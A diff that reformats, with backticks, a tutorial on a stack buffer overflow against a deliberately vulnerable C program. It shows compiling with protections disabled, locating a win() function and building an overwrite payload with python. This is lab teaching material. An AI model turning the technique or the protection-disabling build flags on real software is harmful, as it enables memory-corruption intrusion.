@@ -60,11 +60,11 @@ Overflow buffer[32] with crafted input → overwrite return address → point to
 
 2. Compile with vulnerable flags:
 
-gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie
+`gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie`
 
 3. Find win() address with objdump:
 
-objdump -d ./vuln | grep win
+`objdump -d ./vuln | grep win`
 
 Example:
 
@@ -88,11 +88,11 @@ win() = 0x080491e2
 
 We construct input like:
 
-python3 -c 'print("A"*36 + "\xe2\x91\x04\x08")' > input.txt
+`python3 -c 'print("A"*36 + "\xe2\x91\x04\x08")' > input.txt`
 
 Then run:
 
-./vuln < input.txt
+`./vuln < input.txt`
 
 
 ---
@@ -101,7 +101,7 @@ What happens?
 
 Program runs, takes your input into buffer via scanf("%s", buffer) → overflows past buffer → overwrites return address → jumps to win() → shell or print:
 
-YOU HAVE BEEN HACKED! WIN FUNCTION EXECUTED
+`YOU HAVE BEEN HACKED! WIN FUNCTION EXECUTED`
 
 
 ---
@@ -110,11 +110,11 @@ Important Note:
 
 This simulation only works with:
 
-No PIE (-no-pie)
+No PIE (`-no-pie`)
 
-No stack protector (-fno-stack-protector)
+No stack protector (`-fno-stack-protector`)
 
-Executable stack (-z execstack) — for shellcode injection if you go that far
+Executable stack (`-z execstack`) — for shellcode injection if you go that far
 
 
 
